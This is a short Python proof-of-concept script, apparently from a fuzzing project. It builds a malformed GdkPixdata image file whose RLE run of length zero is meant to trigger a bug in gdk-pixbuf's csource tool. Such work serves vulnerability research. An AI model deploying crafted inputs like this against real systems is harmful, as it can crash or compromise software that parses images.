import struct
import os

POC_DIR = "/data/ylwang/non-textfuzz/target/_poc/gdk-pixbuf/gdk-pixbuf_gdk-pixbuf-csource_c"

# GdkPixdata constants (all BIG-ENDIAN)
MAGIC = 0x47646b50  # "GdkP"
PIXDATA_TYPE_RGBA_RLE = 0x02 | 0x010000 | 0x02000000  # 0x02010002

# 1x1 RGBA image
width = 1
height = 1
bpp = 4
rowstride = width * bpp  # = 4

# pixel_data: constant run with 0x80 (length=0 bug)
pixel_data = bytes([
    0x80,        # constant run, length = 0x80 - 128 = 0 (TRIGGERS BUG)
    0xFF, 0x00, 0x00, 0xFF,  # RGBA pixel: red
])

total_length = 24 + len(pixel_data)  # header + pixel_data

# Pack header in big-endian
header = struct.pack(">IIIIII",
    MAGIC,               # magic
    total_length,        # length (total stream size)
    PIXDATA_TYPE_RGBA_RLE,  # pixdata_type
    rowstride,           # rowstride
    width,               # width
    height,              # height
)

data = header + pixel_data
outpath = os.path.join(POC_DIR, "vuln_001.gdkp")
with open(outpath, "wb") as f:
    f.write(data)
print(f"Generated {outpath} ({len(data)} bytes)")
